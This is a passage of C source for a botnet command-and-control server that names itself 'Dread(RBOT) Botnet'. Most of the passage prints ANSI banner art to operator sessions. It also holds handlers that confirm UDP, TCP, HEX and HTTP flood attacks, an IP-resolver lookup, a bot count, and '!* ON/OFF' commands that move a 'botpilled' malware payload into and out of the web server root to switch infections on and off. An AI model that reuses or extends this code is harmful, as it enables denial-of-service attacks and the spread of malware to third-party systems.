            sprintf(galaxybanner3,   "\033[35m      \033[36m 888    888\033[35m          888                             \033[32m  : O. Oo;    \r\n");
            sprintf(galaxybanner4,   "\033[35m      \033[36m 888       \033[35m  8888b.  888  8888b.  888  888 888  888 \033[32m    `-.O-'     \r\n");
            sprintf(galaxybanner5,   "\033[35m      \033[36m 888  88888\033[35m     *88b 888     *88b `Y8bd8P' 888  888 \033[32m              \r\n");
            sprintf(galaxybanner6,   "\033[35m      \033[36m 888    888\033[35m .d888888 888 .d888888   X88K   888  888 \033[32m              \r\n");
            sprintf(galaxybanner7,   "\033[35m      \033[36m Y88b  d88P\033[35m 888  888 888 888  888 .d8**8b. Y88b 888 \033[32m              \r\n");
            sprintf(galaxybanner8,   "\033[35m      \033[36m  *Y8888P88\033[35m *Y888888 888 *Y888888 888  888  *Y88888 \033[32m              \r\n");
            sprintf(galaxybanner9,   "\033[35m      \033[36m           \033[35m                        \033[32m.\033[35m            888 \033[32m              \r\n");
            sprintf(galaxybanner10,  "\033[35m      \033[36m    \033[32mo\033[35m       \033[35m                               Y8b d88P \033[32m              \r\n");
            sprintf(galaxybanner11,  "\033[35m      \033[36m           \033[35m                                 *Y88P*  \033[32m              \r\n");
            sprintf(galaxybanner12,  "\033[35m     Dread v1\r\n");
            sprintf(galaxybanner13,  " \r\n");
            
            if (send(datafd, galaxybanner0, strlen(galaxybanner0), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, galaxybanner1, strlen(galaxybanner1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, galaxybanner2, strlen(galaxybanner2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, galaxybanner3, strlen(galaxybanner3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, galaxybanner4, strlen(galaxybanner4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, galaxybanner5, strlen(galaxybanner5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, galaxybanner6, strlen(galaxybanner6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, galaxybanner7, strlen(galaxybanner7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, galaxybanner8, strlen(galaxybanner8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, galaxybanner9, strlen(galaxybanner9), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, galaxybanner10, strlen(galaxybanner10), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, galaxybanner11, strlen(galaxybanner11), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, galaxybanner12, strlen(galaxybanner12), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, galaxybanner13, strlen(galaxybanner13), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, ".hentai"))
        {
            char hentaibanner0 [800];
            char hentaibanner1 [800];
            char hentaibanner2 [800];
            char hentaibanner3 [800];
            char hentaibanner4 [800];
            char hentaibanner5 [800];
            char hentaibanner6 [800];
            char hentaibanner7 [800];
            char hentaibanner8 [800];
            char hentaibanner9 [800];
            char hentaibanner10 [800];
            char hentaibanner11 [800];
            char hentaibanner12 [800];
            char hentaibanner13 [800];
            char hentaibanner14 [800];
            char hentaibanner15 [800];
            char hentaibanner16 [800];
            
            sprintf(hentaibanner1, "\033[2J\033[1;1H");
            sprintf(hentaibanner2, "\r\033[0;96mSenpai\033[0;33m: \033[0m%s\r\n", uname);
            sprintf(hentaibanner3, "\r\033[0;95mPassword\033[0;33m: **********\033[0m\r\n");
            sprintf(hentaibanner4, "\r\n\033[0m");
            sprintf(hentaibanner5, "\r\033[0;37m                        [\033[0;31m+\033[0;95m] \033[0;96mFuck Me Senpai <3 \033[0;95m[\033[0;31m+\033[0;95m]       \r\n");
            sprintf(hentaibanner6, "\r\n\033[0m");
            sprintf(hentaibanner7, "\r\033[0;95m         \r\n");
            sprintf(hentaibanner8, "\r\033[0;95m                 ██\033[0;96m╗  \033[0;95m██\033[0;96m╗\033[0;95m███████\033[0;96m╗\033[0;95m███\033[0;96m╗   \033[0;95m██\033[0;96m╗\033[0;95m████████\033[0;96m╗ \033[0;95m█████\033[0;96m╗ \033[0;95m██\033[0;96m╗   \r\n");
            sprintf(hentaibanner9, "\r\033[0;95m                 ██\033[0;96m║  \033[0;95m██\033[0;96m║\033[0;95m██\033[0;96m╔════╝\033[0;95m████\033[0;96m╗  \033[0;95m██\033[0;96m║╚══\033[0;95m██\033[0;96m╔══╝\033[0;95m██\033[0;96m╔══\033[0;95m██\033[0;96m╗\033[0;95m██\033[0;96m║   \r\n");
            sprintf(hentaibanner10, "\r\033[0;95m                 ███████\033[0;96m║\033[0;95m█████\033[0;96m╗  \033[0;95m██\033[0;96m╔\033[0;95m██\033[0;96m╗ \033[0;95m██\033[0;96m║   \033[0;95m██\033[0;96m║   \033[0;95m███████\033[0;96m║\033[0;95m██\033[0;96m║   \r\n");
            sprintf(hentaibanner11, "\r\033[0;95m                 ██\033[0;96m╔══\033[0;95m██\033[0;96m║\033[0;95m██\033[0;96m╔══╝  \033[0;95m██\033[0;96m║╚\033[0;95m██\033[0;96m╗\033[0;95m██\033[0;96m║   \033[0;95m██\033[0;96m║   \033[0;95m██\033[0;96m╔══\033[0;95m██\033[0;96m║\033[0;95m██\033[0;96m║   \r\n");
            sprintf(hentaibanner12, "\r\033[0;95m                 ██\033[0;96m║  \033[0;95m██\033[0;96m║\033[0;95m███████\033[0;96m╗\033[0;95m██\033[0;96m║ ╚\033[0;95m████\033[0;96m║   \033[0;95m██\033[0;96m║   \033[0;95m██\033[0;96m║  \033[0;95m██\033[0;96m║\033[0;95m██\033[0;96m║   \r\n");
            sprintf(hentaibanner13, "\r\033[0;96m                 ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝                                                                                                                                                                                                    \r\n");
            sprintf(hentaibanner14, "\r\033[0;95m               [\033[0;31m+\033[0;96m] Dread(RBOT) Botnet - Created By ELA <3 [\033[0;31m+\033[0;95m]        \r\n");
            sprintf(hentaibanner15, "\r\033[0;95m         \r\n");
            sprintf(hentaibanner16, "\r\n\033[0m");
            
            if (send(datafd, hentaibanner0, strlen(hentaibanner0), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner1, strlen(hentaibanner1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner2, strlen(hentaibanner2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner3, strlen(hentaibanner3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner4, strlen(hentaibanner4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner5, strlen(hentaibanner5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner6, strlen(hentaibanner6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner7, strlen(hentaibanner7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner8, strlen(hentaibanner8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner9, strlen(hentaibanner9), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner10, strlen(hentaibanner10), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner11, strlen(hentaibanner11), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner12, strlen(hentaibanner12), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner13, strlen(hentaibanner13), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner14, strlen(hentaibanner14), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner15, strlen(hentaibanner15), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hentaibanner16, strlen(hentaibanner16), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, ".hoho"))
        {
            char hohobanner0 [800];
            char hohobanner1 [800];
            char hohobanner2 [800];
            char hohobanner3 [800];
            char hohobanner4 [800];
            char hohobanner5 [800];
            char hohobanner6 [800];
            char hohobanner7 [800];
            char hohobanner8 [800];
            char hohobanner9 [800];
            char hohobanner10 [800];
            
            sprintf(hohobanner1, "\033[2J\033[1;1H");
            sprintf(hohobanner2, "\033[1;31m\r\n");
            sprintf(hohobanner3, "\033[1;31m             888    888\033[1;36m        \033[1;31m  888    888  \033[1;36m        \r\n");
            sprintf(hohobanner4, "\033[1;31m             888    888\033[1;36m        \033[1;31m  888    888  \033[1;36m        \r\n");
            sprintf(hohobanner5, "\033[1;31m             888    888\033[1;36m        \033[1;31m  888    888  \033[1;36m        \r\n");
            sprintf(hohobanner6, "\033[1;31m             8888888888\033[1;36m  .d88b.\033[1;31m  8888888888  \033[1;36m.d88b.  \r\n");
            sprintf(hohobanner7, "\033[1;31m             888    888\033[1;36m d88\"\"88b\033[1;31m 888    888\033[1;36m d88\"\"88b \r\n");
            sprintf(hohobanner8, "\033[1;31m             888    888\033[1;36m 888  888\033[1;31m 888    888 \033[1;36m888  888 \r\n");
            sprintf(hohobanner9, "\033[1;31m             888    888\033[1;36m Y88..88P\033[1;31m 888    888 \033[1;36mY88..88P \r\n");
            sprintf(hohobanner10, "\033[1;31m             888    888\033[1;36m  \"Y88P\"\033[1;31m  888    888\033[1;36m  \"Y88P\"  \r\n");
            
            if (send(datafd, hohobanner0, strlen(hohobanner0), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hohobanner1, strlen(hohobanner1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hohobanner2, strlen(hohobanner2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hohobanner3, strlen(hohobanner3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hohobanner4, strlen(hohobanner4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hohobanner5, strlen(hohobanner5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hohobanner6, strlen(hohobanner6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hohobanner7, strlen(hohobanner7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hohobanner8, strlen(hohobanner8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hohobanner9, strlen(hohobanner9), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hohobanner10, strlen(hohobanner10), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, ". UDP"))//confirming attacks were sent and client used the right syntax
        {
            char udpsent [500];
            sprintf(udpsent, "\033[37mUDP Flood \033[32m SENT\033[37m...\r\n");
            if (send(datafd, udpsent, strlen(udpsent), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, ". TCP"))
        {
            char tcpsent [500];
            sprintf(tcpsent, "\033[37mTCP Flood \033[32m SENT\033[37m...\r\n");
            if (send(datafd, tcpsent, strlen(tcpsent), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, ". HEX"))
        {
            char udphexsent [500];
            sprintf(udphexsent, "\033[37mUDP-HEX Flood \033[32m SENT\033[37m...\r\n");
            if (send(datafd, udphexsent, strlen(udphexsent), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, ". RHEX"))
        {
            char udprsent [500];
            sprintf(udprsent, "\033[37mRandom HEX Flood \033[32m SENT\033[37m...\r\n");
            if (send(datafd, udprsent, strlen(udprsent), MSG_NOSIGNAL) == -1) goto end;
        }
        if (strstr(buf, ". HTTP"))
        {
            char udprsent [500];
            sprintf(udprsent, "\033[37mHTTP Flood \033[32m SENT\033[37m...\r\n");
            if (send(datafd, udprsent, strlen(udprsent), MSG_NOSIGNAL) == -1) goto end;
        }
        if (strstr(buf, ". STOP"))
        {
            char udprsent [500];
            sprintf(udprsent, "\033[37mAttacks \033[1;91mSTOPPED\033[37m...\r\n");
            if (send(datafd, udprsent, strlen(udprsent), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, ".resolve"))
        {
            char myhost[20];
            char ki11[1024];
            snprintf(ki11, sizeof(ki11), "%s", buf);
            trim(ki11);
            char *token = strtok(ki11, " ");
            snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1);
            if(atoi(myhost) >= 8)
            {
                int ret;
                int IPLSock = -1;
                char iplbuffer[1024];
                int conn_port = 80;
                char iplheaders[1024];
                struct timeval timeout;
                struct sockaddr_in sock;
                char *iplookup_host = "0.0.0.0";//changeme
                timeout.tv_sec = 4;//timeout in secs
                timeout.tv_usec = 0;
                IPLSock = socket(AF_INET, SOCK_STREAM, 0);
                sock.sin_family = AF_INET;
                sock.sin_port = htons(conn_port);
                sock.sin_addr.s_addr = inet_addr(iplookup_host);
                if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1)
                {
                    sprintf(botnet, "\033[31;1m[IPLookup] Failed to connect to iplookup server...\033[31;1m\r\n", myhost);//maybe open port 80?
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else
                {
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iptool.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/531m.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/531m.36\r\n\r\n", myhost, iplookup_host);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        sprintf(botnet, "\033[38;5;250mSearching For Database\033[1;97m -> %s...\r\n", myhost);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        char ch;
                        int retrv = 0;
                        uint32_t header_parser = 0;
                        while (header_parser != 0x0D0A0D0A)
                        {
                            if ((retrv = read(IPLSock, &ch, 1)) != 1)
                                break;
                
                            header_parser = (header_parser << 8) | ch;
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer));
                        while(ret = read(IPLSock, iplbuffer, 1024))
                        {
                            iplbuffer[ret] = '\0';
                        }
                        if(strstr(iplbuffer, "<title>404"))
                        {
                            char iplookup_host_token[20];
                            sprintf(iplookup_host_token, "%s", iplookup_host);
                            int ip_prefix = atoi(strtok(iplookup_host_token, "."));
                            sprintf(botnet, "\033[31m[IP Resolver] Failed, API can't be located on server %d.*.*.*:80\033[0m\r\n", ip_prefix);//check file name
                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token));
                        }
                        else if(strstr(iplbuffer, "nophp"))
                            sprintf(botnet, "\033[31m[IP Resolver] Failed, Hosting server needs to have php installed for api to work...\033[0m\r\n");//yum install php -y
                        else sprintf(botnet, "\033[1;90m[+]--- \033[38;5;250mResults\033[1;90m ---[+]\r\n\033[01;36m%s\033[31m\r\n", iplbuffer);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                    else
                    {
                        sprintf(botnet, "\033[31m[IP Resolver] Failed to send request headers...\r\n");
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                close(IPLSock);
            }
        }
        if (strncmp(buf, "bots", 4) == 0 || strncmp(buf, "botcount", 8) == 0) {
            char x86[128];

            sprintf(x86, "\033[1;90mServers   \033[38;5;250m~>\033[1;90m %d\r\n", BotsConnected());
            if (send(datafd, x86, strlen(x86), MSG_NOSIGNAL) == -1) goto end;
        }
        if (strstr(buf, "cls")) {
            if (send(datafd, x6ascii_banner_line1, strlen(x6ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6ascii_banner_line2, strlen(x6ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6ascii_banner_line3, strlen(x6ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6ascii_banner_line4, strlen(x6ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6ascii_banner_line5, strlen(x6ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6ascii_banner_line6, strlen(x6ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6ascii_banner_line7, strlen(x6ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6ascii_banner_line8, strlen(x6ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6ascii_banner_line9, strlen(x6ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
        }

        if(strstr(buf, "!* OFF")) {//malware must be hosted on c2 server for this command to work, and no im not making an api to do it remotely. stop being a fucking retard.
            system("mv /var/www/html/botpilled /tmp");
            char offmsg[800];
            sprintf(offmsg, "Infections \033[1;91mDisabled\033[37m...\r\n");
            if (send(datafd, offmsg, strlen(offmsg), MSG_NOSIGNAL) == -1) goto end;
        }

        if(strstr(buf, "!* ON")){
            system("mv /tmp/botpilled /var/www/html");
            char onmsg[800];
            sprintf(onmsg, "Infections \033[1;92mEnabled\033[37m...\r\n");
            if (send(datafd, onmsg, strlen(onmsg), MSG_NOSIGNAL) == -1) goto end;
        }

        if(strstr(buf, "logout")) {//yakuza throwback
            char x6logout_message1[800];
            char x6logout_message2[800];
            char x6logout_message3[800];
            char x6logout_message4[800];
            char x6logout_message5[800];
            char x6logout_message6[800];
            char x6logout_message7[800];
            char x6logout_message8[800];
            char x6logout_message9[800];
            
            sprintf(x6logout_message1, "\033[1;90m\033[2J\033[1;1H");
            sprintf(x6logout_message2, "\033[1;90m\r\n");
            sprintf(x6logout_message3, "\033[1;90m                    ██████\033[038;5;250m╗\033[1;90m ██████\033[038;5;250m╗ \033[1;90m███████\033[038;5;250m╗ \033[1;90m█████\033[038;5;250m╗ \033[1;90m██████\033[038;5;250m╗ \r\n");
            sprintf(x6logout_message4, "\033[1;90m                    ██\033[038;5;250m╔══\033[1;90m██\033[038;5;250m╗\033[1;90m██\033[038;5;250m╔══\033[1;90m██\033[038;5;250m╗\033[1;90m██\033[038;5;250m╔════╝\033[1;90m██\033[038;5;250m╔══\033[1;90m██\033[038;5;250m╗\033[1;90m██\033[038;5;250m╔══\033[1;90m██\033[038;5;250m╗\r\n");
            sprintf(x6logout_message5, "\033[1;90m                    ██\033[038;5;250m║  \033[1;90m██\033[038;5;250m║\033[1;90m██████\033[038;5;250m╔╝\033[1;90m█████\033[038;5;250m╗  \033[1;90m███████\033[038;5;250m║\033[1;90m██\033[038;5;250m║  \033[1;90m██\033[038;5;250m║\r\n");
            sprintf(x6logout_message6, "\033[1;90m                    ██\033[038;5;250m║  \033[1;90m██\033[038;5;250m║\033[1;90m██\033[038;5;250m╔══\033[1;90m██\033[038;5;250m╗\033[1;90m██\033[038;5;250m╔══╝  \033[1;90m██\033[038;5;250m╔══\033[1;90m██\033[038;5;250m║\033[1;90m██\033[038;5;250m║  \033[1;90m██\033[038;5;250m║\r\n");
            sprintf(x6logout_message7, "\033[1;90m                    ██████\033[038;5;250m╔╝\033[1;90m██\033[038;5;250m║  \033[1;90m██\033[038;5;250m║\033[1;90m███████\033[038;5;250m╗\033[1;90m██\033[038;5;250m║  \033[1;90m██\033[038;5;250m║\033[1;90m██████\033[038;5;250m╔╝\r\n");
            sprintf(x6logout_message8, "\033[1;90m                    \033[038;5;250m╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ \r\n");
            sprintf(x6logout_message9, "\033[01;90m                          [+] \033[038;5;250mWelcome to RBOT \033[01;90m[+]     \r\n");
            
            if (send(datafd, x6logout_message1, strlen(x6logout_message1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6logout_message2, strlen(x6logout_message2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6logout_message3, strlen(x6logout_message3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6logout_message4, strlen(x6logout_message4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6logout_message5, strlen(x6logout_message5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6logout_message6, strlen(x6logout_message6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6logout_message7, strlen(x6logout_message7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6logout_message8, strlen(x6logout_message8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x6logout_message9, strlen(x6logout_message9), MSG_NOSIGNAL) == -1) goto end;
            sleep(1);
            sprintf(clearscreen, "\033[2J\033[1;1H");
        
            char x5logout_message1[800];
            char x5logout_message2[800];
            char x5logout_message3[800];
            char x5logout_message4[800];
            char x5logout_message5[800];
            char x5logout_message6[800];
            char x5logout_message7[800];
            char x5logout_message8[800];
            char x5logout_message9[800];
            
            sprintf(x5logout_message1, "\033[1;95m\033[2J\033[1;1H");
            sprintf(x5logout_message2, "\033[1;95m\r\n");
            sprintf(x5logout_message3, "\033[1;95m                    ██████\033[1;90m╗\033[1;95m ██████\033[1;90m╗ \033[1;95m███████\033[1;90m╗ \033[1;95m█████\033[1;90m╗ \033[1;95m██████\033[1;90m╗ \r\n");
            sprintf(x5logout_message4, "\033[1;95m                    ██\033[1;90m╔══\033[1;95m██\033[1;90m╗\033[1;95m██\033[1;90m╔══\033[1;95m██\033[1;90m╗\033[1;95m██\033[1;90m╔════╝\033[1;95m██\033[1;90m╔══\033[1;95m██\033[1;90m╗\033[1;95m██\033[1;90m╔══\033[1;95m██\033[1;90m╗\r\n");
            sprintf(x5logout_message5, "\033[1;95m                    ██\033[1;90m║  \033[1;95m██\033[1;90m║\033[1;95m██████\033[1;90m╔╝\033[1;95m█████\033[1;90m╗  \033[1;95m███████\033[1;90m║\033[1;95m██\033[1;90m║  \033[1;95m██\033[1;90m║\r\n");
            sprintf(x5logout_message6, "\033[1;95m                    ██\033[1;90m║  \033[1;95m██\033[1;90m║\033[1;95m██\033[1;90m╔══\033[1;95m██\033[1;90m╗\033[1;95m██\033[1;90m╔══╝  \033[1;95m██\033[1;90m╔══\033[1;95m██\033[1;90m║\033[1;95m██\033[1;90m║  \033[1;95m██\033[1;90m║\r\n");
            sprintf(x5logout_message7, "\033[1;95m                    ██████\033[1;90m╔╝\033[1;95m██\033[1;90m║  \033[1;95m██\033[1;90m║\033[1;95m███████\033[1;90m╗\033[1;95m██\033[1;90m║  \033[1;95m██\033[1;90m║\033[1;95m██████\033[1;90m╔╝\r\n");
            sprintf(x5logout_message8, "\033[1;95m");
            sprintf(x5logout_message9, "\033[01;95m\r\n");
            
            if (send(datafd, x5logout_message1, strlen(x5logout_message1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x5logout_message2, strlen(x5logout_message2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x5logout_message3, strlen(x5logout_message3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x5logout_message4, strlen(x5logout_message4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x5logout_message5, strlen(x5logout_message5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x5logout_message6, strlen(x5logout_message6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x5logout_message7, strlen(x5logout_message7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x5logout_message8, strlen(x5logout_message8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x5logout_message9, strlen(x5logout_message9), MSG_NOSIGNAL) == -1) goto end;
            sleep(1);
            sprintf(clearscreen, "\033[2J\033[1;1H");
        
            char x4logout_message1[800];
            char x4logout_message2[800];
            char x4logout_message3[800];
            char x4logout_message4[800];
            char x4logout_message5[800];
            char x4logout_message6[800];
            char x4logout_message7[800];
            char x4logout_message8[800];
            char x4logout_message9[800];
            
            sprintf(x4logout_message1, "\033[1;96m\033[2J\033[1;1H");
            sprintf(x4logout_message2, "\033[1;96m\r\n");
            sprintf(x4logout_message3, "\033[1;96m                    ██████\033[1;90m╗\033[1;96m ██████\033[1;90m╗ \033[1;96m███████\033[1;90m╗ \033[1;96m█████\033[1;90m╗ \033[1;96m██████\033[1;90m╗ \r\n");
            sprintf(x4logout_message4, "\033[1;96m                    ██\033[1;90m╔══\033[1;96m██\033[1;90m╗\033[1;96m██\033[1;90m╔══\033[1;96m██\033[1;90m╗\033[1;96m██\033[1;90m╔════╝\033[1;96m██\033[1;90m╔══\033[1;96m██\033[1;90m╗\033[1;96m██\033[1;90m╔══\033[1;96m██\033[1;90m╗\r\n");
            sprintf(x4logout_message5, "\033[1;96m                    ██\033[1;90m║  \033[1;96m██\033[1;90m║\033[1;96m██████\033[1;90m╔╝\033[1;96m█████\033[1;90m╗  \033[1;96m███████\033[1;90m║\033[1;96m██\033[1;90m║  \033[1;96m██\033[1;90m║\r\n");
            sprintf(x4logout_message6, "\033[1;96m                    ██\033[1;90m║  \033[1;96m██\033[1;90m║\033[1;96m██\033[1;90m╔══\033[1;96m██\033[1;90m╗\033[1;96m██\033[1;90m╔══╝  \033[1;96m██\033[1;90m╔══\033[1;96m██\033[1;90m║\033[1;96m██\033[1;90m║  \033[1;96m██\033[1;90m║\r\n");
            sprintf(x4logout_message7, "\033[1;96m\r\n");
            sprintf(x4logout_message8, "\033[1;96m");
            sprintf(x4logout_message9, "\033[01;96m\r\n");
            
            if (send(datafd, x4logout_message1, strlen(x4logout_message1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x4logout_message2, strlen(x4logout_message2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x4logout_message3, strlen(x4logout_message3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x4logout_message4, strlen(x4logout_message4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x4logout_message5, strlen(x4logout_message5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x4logout_message6, strlen(x4logout_message6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x4logout_message7, strlen(x4logout_message7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x4logout_message8, strlen(x4logout_message8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x4logout_message9, strlen(x4logout_message9), MSG_NOSIGNAL) == -1) goto end;
            sleep(1);
            sprintf(clearscreen, "\033[2J\033[1;1H");
        
            char x3logout_message1[800];
            char x3logout_message2[800];
            char x3logout_message3[800];
            char x3logout_message4[800];
            char x3logout_message5[800];
            char x3logout_message6[800];
            char x3logout_message7[800];
            char x3logout_message8[800];
            char x3logout_message9[800];
            
            sprintf(x3logout_message1, "\033[1;92m\033[2J\033[1;1H");
            sprintf(x3logout_message2, "\033[1;92m\r\n");
            sprintf(x3logout_message3, "\033[1;92m                    ██████\033[1;90m╗\033[1;92m ██████\033[1;90m╗ \033[1;92m███████\033[1;90m╗ \033[1;92m█████\033[1;90m╗ \033[1;92m██████\033[1;90m╗ \r\n");
            sprintf(x3logout_message4, "\033[1;92m                    ██\033[1;90m╔══\033[1;92m██\033[1;90m╗\033[1;92m██\033[1;90m╔══\033[1;92m██\033[1;90m╗\033[1;92m██\033[1;90m╔════╝\033[1;92m██\033[1;90m╔══\033[1;92m██\033[1;90m╗\033[1;92m██\033[1;90m╔══\033[1;92m██\033[1;90m╗\r\n");
            sprintf(x3logout_message5, "\033[1;92m                    ██\033[1;90m║  \033[1;92m██\033[1;90m║\033[1;92m██████\033[1;90m╔╝\033[1;92m█████\033[1;90m╗  \033[1;92m███████\033[1;90m║\033[1;92m██\033[1;90m║  \033[1;92m██\033[1;90m║\r\n");
            sprintf(x3logout_message6, "\033[1;92m\r\n");
            sprintf(x3logout_message7, "\033[1;92m\r\n");
            sprintf(x3logout_message8, "\033[1;92m\r\n");
            sprintf(x3logout_message9, "\033[1;92m\r\n");
            
            if (send(datafd, x3logout_message1, strlen(x3logout_message1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x3logout_message2, strlen(x3logout_message2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x3logout_message3, strlen(x3logout_message3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x3logout_message4, strlen(x3logout_message4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x3logout_message5, strlen(x3logout_message5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x3logout_message6, strlen(x3logout_message6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x3logout_message7, strlen(x3logout_message7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x3logout_message8, strlen(x3logout_message8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x3logout_message9, strlen(x3logout_message9), MSG_NOSIGNAL) == -1) goto end;
            sleep(1);
            sprintf(clearscreen, "\033[2J\033[1;1H");
        
            char x2logout_message1[800];
            char x2logout_message2[800];
            char x2logout_message3[800];
            char x2logout_message4[800];
            char x2logout_message5[800];
            char x2logout_message6[800];
            char x2logout_message7[800];
            char x2logout_message8[800];
            char x2logout_message9[800];
            
            sprintf(x2logout_message1, "\033[1;91m\033[2J\033[1;1H");
            sprintf(x2logout_message2, "\033[1;91m\r\n");
            sprintf(x2logout_message3, "\033[1;91m                    ██████\033[1;90m╗\033[1;91m ██████\033[1;90m╗ \033[1;91m███████\033[1;90m╗ \033[1;91m█████\033[1;90m╗ \033[1;91m██████\033[1;90m╗ \r\n");
